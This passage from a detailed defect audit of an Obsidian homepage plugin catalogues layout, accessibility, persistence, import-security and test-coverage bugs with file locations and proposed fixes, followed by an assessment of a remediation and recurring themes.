- **Fix:** put the scroll on `.block-content` (gallery `height: auto`), or add `grid-auto-rows: max-content` with a selector that outranks the generic rule. Ship it together with M42.

#### M42. A fixed-height gallery waits on lazy images that never load, so the loading skeleton covers it indefinitely
medium · NEW, related RF-P1 · remediation: no · votes 3/3 · R17 · `src/blocks/ImageGalleryBlock.ts:345`, `:366`, `:372-385`, `:178-205`, `:414-417`, `src/GridLayout.ts:518`, `:532-538`
- **Failure:** in fixed mode, images past the first row are lazy. The thumbnail pool awaits each image's load with no timeout, and lazy images inside the clipped box never load. Six of them park every worker, so `render()` never settles and the opaque skeleton stays over the block: on every cold render in masonry, and in grid mode with very large folders. Most thumbnails are never generated.
- **Fix:** do not await lazy images (resolve once the DOM is built), add a timeout to `waitForImage`, or generate thumbnails on intersection.

#### M43. Tag matching differs from Obsidian's: case-sensitive, ignores a `Tags:` key, excludes nested tags
medium · NEW · remediation: no · votes 3/3 · R52, R53, R54 · `src/utils/tags.ts:10`, `:12`, `:17` (`normalizeTag` :21-24)
- **Failure:** `cacheHasTag` compares exact strings from `cache.tags` and `frontmatter.tags`. So:
  - 'Quote' misses notes tagged `#quote`
  - notes whose frontmatter key is spelled `Tags:` are ignored
  - 'quotes' misses `#quotes/stoic`

  Quotes and Random note then show "No files found" or an empty card, while Obsidian's Tags view and `tag:` search list every note.
- **Fix:** build the candidates with `getAllTags(cache)`, which handles the key case, compare case-insensitively and accept `tag/` prefixes. Extend `tests/utils/tags.test.ts`.

#### M44. Quotes and the Random note preview show raw Markdown
medium · NEW · remediation: no · votes 3/3 · R19, R96 · `src/blocks/QuotesListBlock.ts:348-356`, `:28-43`, `src/utils/noteContent.ts:8-12`, `src/blocks/RandomNoteBlock.ts:201-222`
- **Failure:** all three extractors only trim lines and drop `#` lines. Quotes and previews therefore show:
  - callout and blockquote markers
  - code-block contents, for example a Dataview query instead of the quote
  - `%%` and HTML comments that Obsidian hides, which puts private text on the homepage
  - tables, inline fields and block ids
  - link targets instead of their aliases
- **Fix:** write one section-based extractor in `noteContent.ts` (from `cache.sections`, stripping comments, markers, ids and fields, and rendering aliases), and use it for all three.

#### M45. A quote line that starts with an inline tag is dropped as if it were a heading
medium · NEW · remediation: no · votes 3/3 · R20 · `src/blocks/QuotesListBlock.ts:354`, `src/utils/noteContent.ts:11`, `src/blocks/RandomNoteBlock.ts:207`
- **Failure:** a note written as '#quote The obstacle is the way.' loses its only line:
  - list mode silently skips the note
  - the daily card shows only the filename
  - Random note shows no preview
- **Fix:** detect headings with `/^#{1,6}(\s|$)/` (or from `cache.sections`), and strip leading tags instead of dropping the line.

#### M46. Clock and Greeting ticks run from mount time, so the minute shown lags by up to 59 s
medium · NEW · remediation: no · votes 3/3 · R13, R76 · `src/blocks/ClockBlock.ts:33-35`, `:47-48`, `src/blocks/GreetingBlock.ts:190-191`
- **Failure:** with seconds off, both blocks update every 60 s counted from mount. The displayed minute and the date at midnight are wrong for up to 59 s. A custom format that contains seconds updates only once a minute unless 'Show seconds' is also on.
- **Fix:** tick every second and write only when the formatted text changes. Alternatively, align the first tick to the minute and use 1 s whenever the format contains seconds.

#### M47. Unlisted Vimeo videos embed without their privacy hash
medium · NEW · remediation: no · votes 3/3 · R27 · `src/blocks/VideoEmbedBlock.ts:56-58`
- **Failure:** only the numeric id is kept, so unlisted videos show "This video does not exist". `player.vimeo.com` and channel or group links are rejected as "No video URL".
- **Fix:** keep the hash as `?h=`, accept `player.vimeo.com/video/<id>` and channel and group paths, and update `docs/blocks.md`.

#### M48. YouTube embeds fail with Error 153 on mobile
medium (finder: high) · NEW · remediation: no · votes 3/3 · R28 · `src/blocks/VideoEmbedBlock.ts` (the iframe with `referrerpolicy=no-referrer`; the cited lines 152, 216-228 and 287 do not exist in the current 168-line file)
- **Failure:** the embed goes straight to `youtube.com/embed` without a Referer, and YouTube answers with Error 153. The verifiers refuted the desktop half: Obsidian's main process adds a Referer to YouTube embed requests. iOS is confirmed from host code, Android is unverified, and nothing was run in the app.
- **Fix:** on non-https origins, mirror core and use the `releases.obsidian.md/youtube` wrapper; use `strict-origin-when-cross-origin`. Verify on devices.

#### Styling and accessibility

#### M49. Blocks without a title keep a zero-height, unnamed collapse button that a keypress can use to hide them
medium · NEW · remediation: no · votes 3/3 · R37 · `src/grid/BlockWrapper.ts:36-43`, `src/blocks/BaseBlock.ts:72`, `styles.css:2419-2425`, `src/grid/CollapseToggle.ts:37-72`
- **Failure:** every header zone is created as a focusable `role="button"` collapse toggle. Clock, Greeting, Spacer and any block with `_showTitle` off render no header, so their zone is 0 px tall and unnamed but still a Tab stop. Space or Enter collapses the block (saved and synced), and there is no visible way to expand it again.
- **Fix:** set `role`, `tabindex` and `aria-expanded` only when a header is rendered (in `renderHeader`), or never collapse a block that has no header.

#### M50. The text colour on accented cards is chosen wrongly in both themes
medium · NEW · remediation: no · votes 3/3 · R49, R116 · `src/utils/blockStyling.ts:124-135`, `:144`, `styles.css:189`, `:229-290`
- **Failure:** the plugin picks dark text from a linear blend over an assumed 0.05 base luminance. The check runs only in the dark theme and ignores 'Show background' off, opacity and gradients.
  - Dark theme: yellow at 20-40%, or any accent with the background off, gets near-black text on a dark card (down to 1.04:1).
  - Light theme: dark accents at high intensity keep `#222` text on a dark card (1.2-2.7:1).
- **Fix:** compute the blend the way CSS does, against the real background, and choose the higher-contrast text colour in both themes. Skip the class when the background is off, translucent or a gradient.

#### M51. In the dark theme, any accent makes accent-coloured text nearly invisible
medium · NEW · remediation: no · votes 3/3 · R56 · `styles.css:195`, `:199-207`, `:232-254`
- **Failure:** accented cards redefine `--text-accent`, `--color-accent` and `--interactive-accent` as the accent mixed 60% with black, in both themes. In the dark theme the Daily insight title, quote hashtags and focus rings drop to 1.1-1.8:1 for any accent that is not bright. The verifiers found the Random note title unaffected.
- **Fix:** scope the darkening to `.theme-light`. In `.theme-dark`, mix toward white or keep the theme's accent, and check the result for 4.5:1.

### Low

Unless the Notes column says otherwise, each low defect is NEW, outside the remediation diff, and confirmed 3/3.

**Persistence and settings**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M52 | A Static Text save still queued when edit mode starts is reverted by Discard, in memory and on disk | R63 | `EditToolbar.ts:45,76-79`; `main.ts:493,506-509` | Await pending inline commits before the snapshot, or have Discard restore only positions and sizes | Only while another write is in flight |
| M53 | A settings reload during edit mode leaves `hp-toolbar-open` on the view and ends the session with no exit repack and no Discard | R65 | `EditToolbar.ts:218-227`; `HomepageView.ts:23-30` | Clear the class in `destroy()`/`onOpen`; run the exit path or carry edit mode across the reload | Visible effect smaller than stated |
| M54 | An Embedded Note's `filePath` follows a rename only while the block is mounted, and only in the active array | R77 | `EmbeddedNoteBlock.ts:37-46`; `main.ts:498-509` | Plugin-level vault 'rename' handler that rewrites both arrays | Finder: medium. Verifiers: opening a note does not replace the homepage tab, so this is less reachable than claimed |
| M55 | Folder settings do not follow a folder rename: Gallery and Quick links show "not found", Recent files stops excluding, voice notes recreate the old folder | R86 | `ImageGalleryBlock.ts:319`; `FolderLinksBlock.ts:91-95,128`; `RecentFilesBlock.ts:51-54`; `VoiceDictationBlock.ts:259-266` | The same rename handler, extended to folder keys | |
| M56 | After typing and a re-render, clearing the voice key field saves '' and erases another device's stored key | R103 | `VoiceDictationBlock.ts:575-586` | Capture the stored ciphertext once, when the modal opens, and fall back to it | Remediation: yes. Related KEY-SLOT |
| M57 | `persistableLayout` never takes its fast path on the device that can read its key: each save re-reads `data.json` and writes a fresh-IV ciphertext, so every launch uploads a changed file | R115 | `apiKeyLayout.ts:16-37`; `apiKeyCrypto.ts:167-169`; `main.ts:258-259` | Memoise the ciphertext per block and plaintext; read the prior file only when a key needs fresh encryption | Remediation: yes. Related RF-P6 |
| M58 | Load drops blocks of unknown types and unknown top-level fields, then re-saves, so an older plugin version on a synced device deletes a newer version's blocks | R125 | `validation.ts:230,385-392`; `main.ts:258-260` | Keep well-formed unknown blocks as placeholders and carry unknown fields; at least skip the post-load resave | |

**Import and security**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M59 | HTML block inline mode applies no CSP: an imported fragment loads remote media on every open and can overlay the homepage with an `obsidian://` link that silently overwrites a note | R82 | `HtmlBlock.ts:25-38` | Render all HTML in the sandboxed CSP iframe, or strip `style`, media elements and non-http(s) links inline | Related RF-S3-CSP |
| M60 | The iframe CSP meta is ignored when any markup precedes the literal `<head>` | R83 | `HtmlBlock.ts:93-98` | Always prepend the CSP meta as the first bytes of `srcdoc` | **KNOWN RF-S4** (second trigger) |
| M61 | Import lets numbers and booleans into Greeting keys declared `undefined`; the block calls `.trim()` on them, which gives a render error or a TypeError every minute | R121 | `importSanitizer.ts:18-22`; `main.ts:48-52`; `GreetingBlock.ts:127,148` | Declare those keys as `''`, or accept only strings for `undefined`-declared keys | Remediation: yes. Related IMPORT-ELEMENTS |

**Voice**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M62 | In push-to-talk, a slight pan fires `pointercancel` and stops the recording; push mode cannot be used from the keyboard | R101 | `VoiceDictationBlock.ts:145-150`; `styles.css:1213-1228` | `touch-action: none` plus `setPointerCapture`; handle Space/Enter keydown and keyup | Related RF-S5 |
| M63 | An empty transcript (a Gemini-blocked prompt, no candidates) returns to idle with no message and discards the audio | R102 | `VoiceDictationBlock.ts:405-408,467-468,521` | Show a Notice with `blockReason`/`finishReason`; keep the audio | Related RF-R10 |

**Opening notes and paths**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M64 | Focusing an existing homepage tab never makes it the active leaf; Ctrl+W closes the hidden previous tab | R110 | `main.ts:516` | Call `setActiveLeaf(leaf, { focus: true })` after `revealLeaf` | |
| M65 | Ctrl/Cmd-, Ctrl+Alt- and middle-clicks are ignored on Recent files, Folder links, Random note and Vault search; Vault search also opens on right-click | R99 | `RecentFilesBlock.ts:78`; `FolderLinksBlock.ts:143`; `RandomNoteBlock.ts:164,177`; `VaultSearchBlock.ts:85-92,164-171` | Pass the event to the M21 helper; add `auxclick` | |
| M66 | Typed link fields are not trimmed or validated: an empty path, a trailing space or a pasted `[[wikilink]]` creates a stray note on every click | R80 | `FolderLinksBlock.ts:172,263,288`; `BookmarkBlock.ts:106,124`; `ButtonGridBlock.ts:129` | Trim, strip `[[ ]]` and `|alias`, treat empty as no link, resolve before opening (as in M22) | Finder: medium |
| M67 | Folder inputs are used verbatim: the picker's own "/ (vault root)" shows "No folder selected", and a typed `Photos/` is "not found" | R87 | `ImageGalleryBlock.ts:312-321,459`; `FolderLinksBlock.ts:118,227`; `FolderSuggestModal.ts:18,36` | Leave the root out of the picker for these blocks (or support `/`); normalise typed paths | |
| M68 | Recent files 'Exclude folders' excludes nothing for `Templates/` or `/Templates` | R97 | `RecentFilesBlock.ts:30-31,51-54` | Trim, strip slashes, `normalizePath`, compare case-insensitively | The letter-case half is weak |
| M69 | 'Toggle edit mode' and 'Add block' stay in the command palette and silently do nothing when no homepage is open | R108 | `main.ts:270-294` | Use `checkCallback`, or open the homepage first | |

**Edit mode and re-renders**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M70 | A block added in view mode is saved but not shown while any block reports unsaved inline state (a leftover Vault Search query is enough); users add it again and get duplicates | R67, R68, R69 | `GridLayout.ts:280-301`; `VaultSearchBlock.ts:33-35` | Render directly in `addBlock`, or record a pending rerender and run it when the state clears | After the RF-R1 fix, this path is reachable on desktop |
| M71 | Edit-mode re-renders reset the zoom to 100% while the toolbar still shows the old value; this leads into M3 | R70 | `GridLayout.ts:327-330` | Keep the scale in GridLayout and re-apply it after each edit-mode render | |
| M72 | The zoomed single-column editor leaves a large blank area below the last block, and the zoom slider is hidden at 404 px and below | R137 | `styles.css:3787-3791,2972-2976`; `EditToolbar.ts:55-58` | Skip the fit zoom in single column, or scale with CSS `zoom` | |
| M73 | Keyboard focus falls back to `<body>` after every edit-mode action and every toolbar re-render | R104 | `EditHandleBar.ts:58-105,250`; `EditToolbar.ts:102-103` | Remember the focused control (block id and class) and refocus it after render | |
| M74 | `homepage-grid--animating` sticks if the grid re-renders within 500 ms of opening, so every later render replays the entry animation | R66 | `GridLayout.ts:141-146,312` | Remove the class in `teardown()` or on non-initial renders | |
| M75 | The newly added block's highlight animation replays every time the tab is shown again | R72 | `GridLayout.ts:440-446`; `styles.css:3211-3213` | Remove `block-just-added` on `animationend` | |
| M76 | Changing Default columns, Mobile columns or Responsive mode does not update open homepage views | R114 | `HomepageSettingTab.ts:209-257` | Call `reloadOpenHomepages()` after these settings | Related RF-R7 and M6 |

**Layout and loading**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M77 | An Embedded Note stays behind the opaque skeleton until every remote image in the note loads, and indefinitely if an image host never answers | R73 | `GridLayout.ts:518,532-541`; `EmbeddedNoteBlock.ts:48,95` | Remove the skeleton once the DOM is in place (cap it at about 300 ms); keep the measurement on the full promise | |
| M78 | The single-column reorder re-appends every grid item, which reloads every iframe (a playing video restarts) | R105 | `ResponsiveColumns.ts:171-178`; `GridLayout.ts:401-411` | Move only out-of-order elements, or use CSS `order` | "Loads twice on every open" is wrong; tab switches (M31) are the common trigger |
| M79 | In single column, collapsing leaves a 60 px empty band, and with Hover highlight off nothing shows the block is collapsed | R132 | `styles.css:2449-2468,2489-2493,3005-3008` | `min-height: 0` for collapsed blocks in single column; always show the collapsed chevron | |
| M80 | Per-block Padding is ignored on panes up to about 404 px wide (most phones): a literal `padding: 8px` replaces the variable | R133 | `styles.css:3183-3192` | `padding: var(--hp-card-padding, 8px)`, or redefine the token inside the query | |

**Block behaviour**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M81 | Pomodoro drops a paused or between-phases timer, and the session count, on any re-render | R88 | `PomodoroBlock.ts:151-155` | Delete the stored state only when the timer is idle | Related RF-R23 |
| M82 | Pomodoro Skip during a work phase leaves `running: true` stored, so the break starts by itself after the next re-render | R89 | `PomodoroBlock.ts:201-208,323-328` | Call `saveState()` at the end of `skipPhase` | Related RF-R23 |
| M83 | A daily-seeded quote (Max quotes 1) and Random note never roll over at midnight while the homepage stays open | R90, R95 | `QuotesListBlock.ts:72-84,156-158,290-292`; `RandomNoteBlock.ts:32-47,189` | A shared `registerInterval` day-rollover check that calls `scheduleRender` | Both finders: medium. Related RF-R21 |
| M84 | Recent files relative times are computed once per render and never refreshed | R98 | `RecentFilesBlock.ts:30-34,76` | A 60 s interval that rewrites the labels from the stored mtimes | |
| M85 | `dailyEpochDay` repeats one day and skips another at DST changes in UTC+0 zones; the tests run only in the host time zone | R117 | `dailySeed.ts:7` | Derive the day from calendar fields (`Date.UTC(y, m, d)`); add a `TZ=Europe/London` test | |
| M86 | Quotes render falls back to 20 items when `maxItems` is unset, although the factory and the settings treat 0 as "all"; the default 'Daily insight' block is a 20-item list | R92 | `QuotesListBlock.ts:95`; `validation.ts:66-71` | Default to 0 in render; give default-insight an explicit `maxItems` | |
| M87 | Quotes list mode shows an empty card with no hint when the tag matches no note | R93 | `QuotesListBlock.ts:227-276` | Render the same empty-state hint as the other branches | |
| M88 | List mode cuts each quote to 3 lines with no ellipsis, dropping the "— Author" line | R94 | `QuotesListBlock.ts:355` | Take the first content section in full; cap by characters, with an ellipsis | 2/3 (dissent: an intended short excerpt, documented in `docs/blocks.md`) |
| M89 | The daily quote's title is the first heading anywhere in the note (e.g. "Related"), not the note's own title or filename | R122 | `noteContent.ts:5`; `QuotesListBlock.ts:168` | Use `headings[0]` only when it is the first section, else `file.basename` | Finder: medium. Only the title half is a defect; the whole-body join is intended (commit 1413dfe) |
| M90 | Removing the tag from a displayed note leaves it in Quotes and Random note until an unrelated vault event | R91 | `QuotesListBlock.ts:73-78`; `RandomNoteBlock.ts:32-37` | Also re-render when the changed file is one the last render displayed | |
| M91 | An Embedded Note keeps a deleted note's title in its header | R78 | `EmbeddedNoteBlock.ts:63,73-77` | Call `renderHeader(el, '')` in the not-found and empty-path branches | |
| M92 | Static Text and Embedded Note content lacks the `markdown-rendered` class, so tables, code, blockquotes, highlights and wide images use browser defaults | R79 | `StaticTextBlock.ts:44`; `EmbeddedNoteBlock.ts:83` | Add `markdown-rendered` to both containers | |
| M93 | Greeting custom-text fields show Italian salutations as their values, but an untouched field renders the selected language preset | R81 | `GreetingBlock.ts:127-134,263-272` | Show the selected preset as a placeholder, or write the displayed values into the draft | |
| M94 | A new Greeting says "Buongiorno, World" in any app language, and an empty name leaves a trailing comma | R106 | `main.ts:48-51`; `GreetingBlock.ts:132-134,198,205-218` | Derive the default preset from the app locale; use one name default; omit ", " for an empty name | Remediation: yes. 2/3 (dissent: a deliberate default since the initial commit, visible behaviour unchanged) |
| M95 | The default 'Quick actions' block ships six buttons with no link, which do nothing when clicked | R124 | `validation.ts:72-85`; `ButtonGridBlock.ts:47-58` | Ship working links, or ship the block empty with its "No items yet" hint | |
| M96 | The 300-entry FIFO thumbnail cache is smaller than a gallery, so every render re-decodes N-300 images and leaks N-300 more blob URLs | R120 | `imageCache.ts:8,128-139` | An LRU refreshed on hits and sized above the gallery cap; revoke only unreferenced URLs | Finder: medium. Related RF-P1 |
| M97 | Image gallery (grid) and Bookmarks render one column fewer than configured; the Bookmarks default of 2 is a single column | R123 | `responsiveGrid.ts:7` | Subtract the gap from the per-column minimum, or use `repeat(N, minmax(0, 1fr))` | |
| M98 | Button grid never collapses to one column in narrow blocks: the inline `--hp-grid-cols` beats the container query | R75 | `ButtonGridBlock.ts:29`; `styles.css:1566-1574` | Set only a count variable inline; override `grid-template-columns` in the query with a stronger selector | |
| M99 | The Clock's flex centring never applies, so the time sits at the top and the date is pinned to the bottom | R130 | `styles.css:828-833` vs `:2478-2482` | `.homepage-block-wrapper .block-content.clock-block { display: flex; … }` | |
| M100 | Bookmark cards overflow Obsidian's fixed button height: the emoji sticks out above the card and the description hangs below it | R135 | `styles.css:3391-3404` | `height: auto` on `.bookmark-card` | |
| M101 | "Vault Search" is in Title Case, against Obsidian's sentence-case guideline | R107 | `main.ts:202`; `VaultSearchBlock.ts:41` | Rename to "Vault search" | |

**Styling settings and accessibility**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M102 | Card Elevation and the hover-highlight shadow never show in view mode: the bundled GridStack rule clips the item content | R126 | `styles.css:60-62` vs `:2` | `.homepage-grid.grid-stack > .grid-stack-item > .grid-stack-item-content { overflow: visible }` | Related TD-1 |
| M103 | The settings preview shows no padding and no elevation (the tokens exist only on `.homepage-view`), and 'Show border' off cancels Elevation on the card | R111 | `BlockSettingsModal.ts:63-86`; `styles.css:8,29-31,349-354,3227-3235` | Define the tokens on a selector that matches the preview; in `.block-no-border`, clear only the hover shadow | |
| M104 | The preview and placeholder title differ from the rendered default header in seven blocks, and the Header-tab settings do nothing on Clock and Greeting | R112 | `BlockSettingsModal.ts:53,75`; `BlockWrapper.ts:82-84`; per-block title literals | Derive the default title from one source; render headers in Clock and Greeting, or hide the controls and fix `README.md:88-90` | |
| M105 | Gradient pickers show seed colours that are not in the draft: changing one colour gives no gradient, and the displayed seed cannot be picked | R113 | `BlockSettingsModal.ts:247-265`; `blockStyling.ts:193` | On the first change, also write the other picker's value into the draft | |
| M106 | Negative Padding values all render as zero; on Pomodoro and Voice cards the negative inset pushes the content outside the card | R127 | `styles.css:125,3125,3515-3519`; `blockStyling.ts:15,147-150` | Limit the range to 0..48 (and the import range), or implement bleed with `max(0px, …)` | |
| M107 | Accent-tinted block titles and Folder links become unreadable: yellow presets in the light theme (about 1.3-1.8:1), dark accents in the dark theme | R128 | `styles.css:193,221-223,253,1004-1006` | Fall back to `--text-normal` below 4.5:1 | Finder: medium |
| M108 | Yellow accent presets make the Pomodoro Start/Pause label and the voice mic white-on-yellow (1.2-1.7:1) in both themes | R136 | `styles.css:1220-1221,3621-3624` | Set a dark `--text-on-accent` when the raw accent is bright | |
| M109 | The loading skeleton paints an opaque, untinted card over accented, transparent and gradient blocks on every open | R129 | `styles.css:586-598` | `background: inherit`, or a background chosen per state | |
| M110 | 'Show background' off does not hide the background when opacity is below 100, and hovering the card toggles it | R134 | `blockStyling.ts:144,171-175`; `styles.css:357-362` vs `:3238-3241` | Skip `block-custom-opacity` when `_showBackground` is false | |
| M111 | Gradients ignore Background opacity and Backdrop blur, and with an accent any opacity below 100 removes the gradient | R138 | `styles.css:3800` vs `:3238,3241` | Apply the opacity to the gradient stops or a `::before` layer; let the gradient rule outrank the accent-opacity rule | |
| M112 | Several controls have no accessible name: the HTML iframe, the list-row delete buttons, the inline textarea, the handle grip | R84 | `HtmlBlock.ts:105-108`; `ButtonGridBlock.ts:131`; `BookmarkBlock.ts:113`; `GreetingBlock.ts:349`; `StaticTextBlock.ts:226`; `EditHandleBar.ts:49-52` | Add `aria-label`s and an iframe `title` | |
| M113 | The gallery lightbox has no close control, and its Tab trap makes a video's controls unreachable from the keyboard | R85 | `ImageGalleryBlock.ts:53-58,105-146` | Add a labelled Close button; include it and the video in the trap; skip arrow navigation while the video has focus | The mobile screen-reader half is overstated |
| M114 | Vault Search has no combobox semantics, so screen readers are not told which result is highlighted | R100 | `VaultSearchBlock.ts:48-62,149-151,186-191` | `role=combobox`/`listbox`/`option`, `aria-activedescendant`, and a polite live region for the count | |
| M115 | Items in the Button grid, Bookmarks and Quick links settings can only be reordered by mouse drag-and-drop | R118 | `dragReorder.ts:5-32` | Add move-up/down buttons, or handle Alt+Arrow on the rows | |
| M116 | Escape in the emoji picker closes the whole block-settings modal and discards every unsaved change | R119 | `emojiPicker.ts:72-76,137-141` | Handle Escape in the picker: close the panel, `stopPropagation`, return focus to the trigger | Related TD-10 |
| M117 | Several focusable controls (the header collapse toggle, scroll regions, the Static Text edit button) have no visible focus indicator | R131 | `styles.css:2032-2049,2404-2414,2508-2518` | Add `:focus-visible` styles; reveal the edit button on focus | |

**Documentation**

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M118 | The README's CSS snippet (`--hp-padding`/`--hp-card-padding` on `.homepage-view`) does not work on mobile, where `.is-mobile .homepage-view` outranks it | R62 | `README.md:128-136`; `styles.css:3714-3715` | Document `body .homepage-view`, or lower the mobile rule to `:where(.is-mobile)` | Remediation: yes |

**Tests.** No user hits these today. Each lets a regression through while all 231 tests stay green; mutation testing confirmed every one.

| ID | Defect | R | Location | Fix | Notes |
|---|---|---|---|---|---|
| M119 | Discard and Done are untested: turning Discard into Save passes every test | R64 | `EditToolbar.ts:64-91`; `GridLayout.ts:190-199` | Test with a real GridLayout and a plugin double: after Discard the last write equals the snapshot and no later write arrives; after Done the y values are repacked | Finder: medium |
| M120 | Several GridLayout flush and anti-corruption guards have no test | R71 | `GridLayout.ts:244,309,426`; `AutoHeight.ts:95`; `LayoutPersister.ts:102` | Targeted GridLayout and AutoHeightManager tests | |
| M121 | The `main.ts` save path is untested: the RF-R4 guard wiring and the `updateBlockConfig` ordering can be deleted with every test passing | R109 | `main.ts:245,258-260,434,490-510`; `tests/__mocks__/obsidian.ts:98-101` | Give the mock Plugin `loadData`/`saveData`/manifest/adapter and test `HomepagePlugin` | Finder: high. Remediation: yes. 2/3 (dissent: the wiring is correct, so no user can hit it) |
| M122 | The mock Component lifecycle differs from Obsidian: `unload` never calls `onunload`, and `register*` never cleans up | R139 | `tests/__mocks__/obsidian.ts:63-77` | Mirror the host Component; add a teardown test | 2/3 (dissent: accurate, but test infrastructure rather than a defect) |
| M123 | The mock `Setting.addButton`/`addDropdown`/`addSlider` never run their builders, so the export API-key scrub cannot be tested | R140 | `tests/__mocks__/obsidian.ts:170-173`; `HomepageSettingTab.ts:273,374-383` | Build minimal components that invoke the callback; test that exported JSON has no `apiKey` or `customCss` | Finder: medium. 2/3 (dissent: the current code scrubs correctly) |
| M124 | Nothing checks that rerenders stay blocked while a Static Text save is pending, or that `rerender` honours the guard at all | R141 | `tests/blocks/StaticTextBlock.test.ts:69-78`; `GridLayout.ts:298` | Assert `hasUnsavedInlineState()` during the pending save; add a GridLayout guard test | Remediation: yes |
| M125 | The RF-R20 settings test adds the `.homepage-view` class by hand instead of calling `onOpen` | R142 | `tests/settings/HomepageSettingTab.test.ts:9-13`; `HomepageView.ts:30` | Build the view with a plugin double and `await onOpen()` | Remediation: yes |
| M126 | The "same device" key test never reloads the device key from IndexedDB | R143 | `tests/utils/apiKeyLayout.test.ts:51-61`; `apiKeyCrypto.ts:96-106` | Encrypt, call `_resetDeviceKeyCache()`, then decrypt | Finder: medium. Remediation: yes |
| M127 | Nothing asserts the `validateBlocks` id dedup, although CLAUDE.md lists it as covered | R144 | `tests/validation.test.ts:289-296`; `validation.ts:265-270` | Assert the deduplicated ids; add `blocks`/`mobileBlocks` duplicate cases | |

## Defects in the remediation itself

| M | Defect | Remediation change it sits in | Verdict |
|---|---|---|---|
| M11 | Imported static-text Markdown renders verbatim | RF-S3 declared-key allowlist | Incomplete: markup-bearing strings pass the type check unchanged. No worse than before. |
| M13 | Imported numbers not range-checked | RF-S3 value typing | Incomplete: types are checked, ranges are not. |
| M14 | Plaintext-key protection branches untested | new `apiKeyLayout.ts` | Untested. |
| M56 | Clearing the voice key field erases another device's key | RF-S1 other-device key fallback | Incomplete: its own guarantee holds only until the Content tab re-renders. |
| M57 | Save fast path skipped on the key-holding device | save path moved into `apiKeyLayout.ts` | Carried over: the same read-and-re-encrypt ran at `8dff07e`. The new docstring's claim that the fast path "covers every drag and auto-height persist" is wrong for that device. |
| M61 | `undefined`-declared Greeting keys accept any primitive | AP-5 plus RF-S3 | Made worse: at `8dff07e` the Greeting factory declared only `{ name, showTime }`, so these keys were stripped on import. |
| M94 | "Buongiorno, World" default | AP-5 declares `salutationPreset: 'it'` | Visible behaviour unchanged, but every new block now stores `'it'`, so a future locale-aware default cannot reach them. |
| M118 | README CSS snippet fails on mobile | README rewrite | Improved but incomplete: the old `:root` text worked nowhere; the new text works on desktop only. |
| M121 | RF-R4 guard wiring in `main.ts` untested | RF-R4 | Untested. |
| M124 | RF-R3 pending-save guard untested | RF-R3 | Untested: the pre-remediation behaviour passes every test. |
| M125 | RF-R20 test fakes `onOpen` | RF-R20 | Half-tested. |
| M126 | IndexedDB key reload untested | RF-S1 relies on keys surviving a restart | Untested. |

Four more defects sit next to remediated fixes although their own lines are unchanged, so they are marked "remediation: no":
- **M35:** the Static Text auto-height fix still loses the first measurement on narrowed panes.
- **M54:** the Embedded Note rename fix works only while the block is mounted.
- **M28:** RF-R2 (canonical columns in edit mode) entrenches the handle-bar clipping.
- **M70:** since RF-R1, a view-mode Add block reaches `addBlock` on desktop, where the inline-state guard can hide the new block.

## Themes

1. **Every change rebuilds the whole grid, and state held outside the layout is lost.** `render()` tears down every block for edit toggles, moves, saves, settings reloads and column changes, and the unsaved-state guard covers only `rerender()`. What is lost:
   - inline drafts (M4, M52)
   - scroll position (M27)
   - zoom (M71)
   - keyboard focus (M73)
   - Pomodoro state (M81, M82)
   - edit-session state (M53)

   The guard also suppresses the user's own render (M70). Fix pattern: commit or carry state across teardown, and let deliberate user actions bypass the guard.
2. **Auto-height is measured on events instead of observed, sometimes on the wrong element or at the wrong moment.**
   - One-shot measurement misses late or changing content (M34, M36).
   - A flex-sized, size-contained element grows forever (M33).
   - Column changes drop queued measurements (M35), or measure mid-transition and persist the result (M32).
   - Collapse never persists its height (M5).
   - A hidden tab is read as a 0 px pane (M31), which drives M32, M37, M75 and M78.

   A content-sized ResizeObserver per auto-height block, plus a zero-width guard, removes most of this.
3. **Phones and narrow panes run on single-column CSS written for view mode.**
   - `!important` rules leak into edit mode (M25).
   - `height: auto` plus size containment collapses blocks to 60 px (M39).
   - Iframes fall back to 150 px (M38).
   - The handle bar is clipped (M28), collapse leaves a band (M79), padding is ignored (M80), and the zoomed editor leaves blank space (M72).
   - Touch handlers misfire (M24, M62).

   All of these were found by rendering at 375 px; none was checked on a device.
4. **In `styles.css`, generic and bundled rules outrank block rules, and colour rules have no contrast guard.**
   - `.block-content > * { overflow: hidden }` defeats the scroll modes (M40, M41) and clips content (M36, M42).
   - `.block-content { display: grid }` beats the Clock's flex layout (M99).
   - The bundled GridStack CSS (TD-1) clips shadows (M102).
   - An inline custom property beats a container query (M98).
   - Equal-specificity ties decide opacity against background and gradient (M110, M111).
   - Accent colours produce unreadable text (M50, M51, M107, M108).
5. **Import trust.** The RF-S3 allowlist checks each declared key's JSON type, but not what a string contains or a number's range. The confirmation shows only block counts and types. As a result:
   - markup and templates pass verbatim (M11, M12, M59)
   - numbers pass unbounded (M13)
   - `undefined`-declared keys accept any primitive (M61)
   - the iframe CSP placement can be bypassed (M60, known RF-S4)

   Decide which imported fields are untrusted content, then strip, neutralise or preview them.
6. **Voice: every failure path discards the recording.** Audio and transcript live only in the locals of `handleCloudStop`. They are lost on:
   - retired models (M15)
   - a `..` folder that reports success (M17)
   - a case-variant folder (M18)
   - the provider size limit (M19)
   - an empty transcript (M63)

   Recorder lifecycle has its own defects (M16, M62). Related RF-R10 and RF-S5. Writing the audio to the vault before any step that can fail covers the loss half.
7. **Notes are opened by link text, and stored paths never follow renames.** `openLinkText(path, '')` parses `#` in a path and creates an empty note on any miss. That affects held files (M21), stale or unnormalised typed links (M22, M66) and non-http bookmarks (M23), and modifier keys are ignored (M65). Only a mounted Embedded Note updates its stored path on rename (M54, M55, M67, M68). Links inside rendered Markdown have no handler at all (M1). Fix pattern: one BaseBlock open helper (`openFile` for files, resolve-then-open for typed text) and one plugin-level rename handler.
